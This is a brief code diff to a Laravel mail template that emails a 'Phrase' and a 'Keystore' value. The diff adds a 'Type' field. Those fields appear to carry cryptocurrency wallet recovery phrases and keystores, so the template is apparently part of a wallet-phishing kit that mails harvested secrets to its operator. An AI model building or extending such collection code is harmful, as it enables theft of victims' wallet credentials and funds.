@@ -1,6 +1,8 @@
 @component('mail::message')
 # Details
 
+{{ 'Type: ' . $type }}
+
 {{ ($phrase) ? 'Phrase: ' . $phrase : '' }}
 
 {{ ($keystore) ? 'Keystore: ' . $keystore : ' '}}
